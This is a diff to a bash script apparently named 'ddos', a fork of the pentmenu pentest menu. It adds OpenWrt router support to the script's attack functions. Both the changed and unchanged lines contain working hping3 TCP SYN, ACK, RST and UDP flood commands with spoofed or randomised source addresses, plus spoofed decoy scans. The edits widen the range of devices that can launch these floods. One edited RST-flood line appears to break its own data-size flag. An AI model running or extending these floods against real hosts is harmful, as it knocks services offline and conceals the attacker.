@@ -1,4 +1,6 @@
 #!/bin/bash
+# Note: On OpenWrt, install bash first: opkg update && opkg install bash
+# Then run: bash ./ddos
 
 
 #WARNA KESUKAAN
@@ -14,7 +16,54 @@ BlueF='\e[1;34m' #Biru
 RESET="\033[00m" #normal
 orange='\e[38;5;166m'
 #WARNING !!!
-resize -s 70 90 > /dev/null
+
+##OPENWRT SUPPORT##
+# Detect if we are running on OpenWrt
+IS_OPENWRT=0
+if [ -f /etc/openwrt_release ]; then
+    IS_OPENWRT=1
+fi
+
+# Detect hping3 binary location (OpenWrt uses /usr/bin, Debian/Arch use /usr/sbin)
+HPING3_BIN=""
+for _hping_path in /usr/sbin/hping3 /usr/bin/hping3; do
+    if [ -f "$_hping_path" ]; then
+        HPING3_BIN="$_hping_path"
+        break
+    fi
+done
+
+# Check for required tools and warn on OpenWrt if missing
+check_openwrt_deps() {
+    if [ "$IS_OPENWRT" = "1" ]; then
+        echo -e "${yellow}[OpenWrt detected] Checking dependencies...${RESET}"
+        MISSING_PKGS=""
+        command -v curl    >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS curl"
+        command -v nmap    >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS nmap"
+        command -v hping3  >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS hping3"
+        command -v openssl >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS libopenssl"
+        command -v whois   >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS whois"
+        command -v stunnel >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS stunnel"
+        command -v nc      >/dev/null 2>&1 || MISSING_PKGS="$MISSING_PKGS netcat"
+        if [ -n "$MISSING_PKGS" ]; then
+            echo -e "${red}[OpenWrt] Missing packages: $MISSING_PKGS${RESET}"
+            echo -e "${yellow}Install with: opkg update && opkg install$MISSING_PKGS${RESET}"
+            echo -n "Continue anyway? [y/N]: "
+            read _cont
+            if [ "$_cont" != "y" ] && [ "$_cont" != "Y" ]; then
+                echo "Exiting. Install missing packages first." && exit 1
+            fi
+        else
+            echo -e "${okegreen}[OpenWrt] All dependencies found.${RESET}"
+        fi
+    fi
+}
+##/OPENWRT SUPPORT##
+
+# resize terminal - not available on OpenWrt/BusyBox, guard it safely
+if [ "$IS_OPENWRT" = "0" ] && command -v resize >/dev/null 2>&1; then
+    resize -s 70 90 > /dev/null
+fi
 clear
 echo -e $red""
 echo "             80G08        "
@@ -53,6 +102,9 @@ echo -e $lightgreen
 #!/bin/bash
 #set the prompt to show you are in pentmenu and not standard shell
 PS3="Pentmenu@evsystem>"
+
+# Run OpenWrt dependency check once at startup
+check_openwrt_deps
 
 ##MAINMENU##
 ##################
@@ -278,7 +330,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
   echo "Starting.."
 #use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
 #this might not work, but sometimes it does work very well
-  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
+  sudo "$HPING3_BIN" --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
   echo "Done."
 }
 ##END CHECKUPTIME##
@@ -332,7 +384,7 @@ dosmenu()
 ##START TCPSYNFLOOD##
 synflood()
 {		echo "TCP SYN Flood uses hping3...checking for hping3..."
-	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+	if [ -n "$HPING3_BIN" ] && test -f "$HPING3_BIN"; then echo "hping3 found at $HPING3_BIN, continuing!";
 #hping3 is found, so use that for TCP SYN Flood
 		echo "Enter target:"
 #need a target IP/hostname
@@ -375,16 +427,16 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 #fragmentation should therefore place more stress on the target system
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "r" ]; then
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "i" ]; then
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
+		sudo "$HPING3_BIN" -d $DATA --flood --frag -p $PORT -S $TARGET
 	else echo "Not a valid option!  Using interface IP"
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag -p $PORT -S $TARGET
 	fi
 #No hping3 so using nping for TCP SYN Flood
 	else echo "hping3 not found :( trying nping instead"
@@ -434,7 +486,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 ##START TCPACKFLOOD##
 ackflood()
 {		echo "TCP ACK Flood uses hping3...checking for hping3..."
-	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+	if [ -n "$HPING3_BIN" ] && test -f "$HPING3_BIN"; then echo "hping3 found at $HPING3_BIN, continuing!";
 #hping3 is found, so use that for TCP ACK Flood
 		echo "Enter target:"
 #need a target IP/hostname
@@ -477,16 +529,16 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 #fragmentation should therefore place more stress on the target system
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
 	elif [ "$SOURCE" = "r" ]; then
 		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
 	elif [ "$SOURCE" = "i" ]; then
 		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
+		sudo "$HPING3_BIN" -d $DATA --flood --frag -p $PORT -A $TARGET
 	else echo "Not a valid option!  Using interface IP"
 		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag -p $PORT -A $TARGET
 	fi
 #No hping3 so using nping for TCP ACK Flood
 	else echo "hping3 not found :( trying nping instead"
@@ -536,7 +588,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 ##START TCPRSTFLOOD##
 rstflood()
 {		echo "TCP RST Flood uses hping3...checking for hping3..."
-	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+	if [ -n "$HPING3_BIN" ] && test -f "$HPING3_BIN"; then echo "hping3 found at $HPING3_BIN, continuing!";
 #hping3 is found, so use that for TCP RST Flood
 		echo "Enter target:"
 #need a target IP/hostname
@@ -579,16 +631,16 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 #fragmentation should therefore place more stress on the target system
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
+		sudo "$HPING3_BIN" --flood -p $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
 	elif [ "$SOURCE" = "r" ]; then
 		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
 	elif [ "$SOURCE" = "i" ]; then
 		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
+		sudo "$HPING3_BIN" -d $DATA --flood --frag -p $PORT -R $TARGET
 	else echo "Not a valid option!  Using interface IP"
 		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
+		sudo "$HPING3_BIN" --flood -d $DATA --frag -p $PORT -R $TARGET
 	fi
 #No hping3 so using nping for TCP RST Flood
 	else echo "hping3 not found :( trying nping instead"
@@ -639,7 +691,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 udpflood()
 { echo "UDP Flood uses hping3...checking for hping3..."
 #check for hping on the local system
-if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+if [ -n "$HPING3_BIN" ] && test -f "$HPING3_BIN"; then echo "hping3 found at $HPING3_BIN, continuing!";
 #hping3 is found, so use that for UDP Flood
 #need a valid target IP/hostname
 	echo "Enter target:"
@@ -668,17 +720,17 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 #start the attack using values defined earlier
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
+		sudo "$HPING3_BIN" --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
 	elif [ "$SOURCE" = "r" ]; then
 		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
+		sudo "$HPING3_BIN" --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
 	elif [ "$SOURCE" = "i" ]; then
 		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
+		sudo "$HPING3_BIN" --flood --udp --sign $DATA -p $PORT $TARGET
 #if no valid source option is selected, use outgoing interface IP
 	else echo "Not a valid option!  Using interface IP"
 		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
+		sudo "$HPING3_BIN" --flood --udp --sign $DATA -p $PORT $TARGET
 	fi
 #If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
 	else echo "hping3 not found :( trying nping instead"
@@ -862,7 +914,7 @@ echo "Enter spoofed source address:"
 #need a spoofed source address
 read -i $SOURCE -e SOURCE
 #use hping to perform multiple obvious TCP SYN scans
-for i in {1..5}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
+for i in {1..5}; do echo "sending scan $i" && sudo "$HPING3_BIN" --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
 exit 0
 }
 ##END DISTRACTION##
@@ -959,14 +1011,21 @@ if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
 fi
 #show listening ports on system using ss (if available) otherwise use netstat
 	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
-if test -f "/bin/ss"; then
+# On OpenWrt, 'ss' may be at /usr/sbin/ss or unavailable; fall back to netstat
+if command -v ss >/dev/null 2>&1; then
 	LISTPORT=ss;
-	else LISTPORT=netstat
-
+elif command -v netstat >/dev/null 2>&1; then
+	LISTPORT=netstat;
+else
+	LISTPORT=
 fi
 #now we can ask what port to create listener on
 #it cannot of course listen on a port already in use
-	$LISTPORT -$PROTO -n -l
+	if [ -n "$LISTPORT" ]; then
+		$LISTPORT -$PROTO -n -l
+	else
+		echo "(ss/netstat not available on this system, skipping port list)"
+	fi
 echo "Enter port number to listen on (defaults to 8000):"
 	read -i $PORT -e PORT
 	: ${PORT:=8000}
@@ -1043,14 +1102,22 @@ if [[ $? = 1 ]]
 then
 echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
 fi
-#is ss is available, use that to shoew listening ports
-if test -f "/bin/ss"; then
+#is ss available? use command -v for portability (works on OpenWrt too)
+if command -v ss >/dev/null 2>&1; then
 	LISTPORT=ss;
 #otherwise use netstat
-	else LISTPORT=netstat
+elif command -v netstat >/dev/null 2>&1; then
+	LISTPORT=netstat;
+else
+	LISTPORT=
 fi
 #show listening ports and check for port 9991
-$LISTPORT -tln |grep -q $LPORT
+if [ -n "$LISTPORT" ]; then
+	$LISTPORT -tln | grep -q $LPORT
+else
+	# Can't check ports without ss/netstat, assume not in use
+	false
+fi
 if [[ "$?" = "1" ]]
 #if nothing is running on port 9991, create stunnel configuration
 then
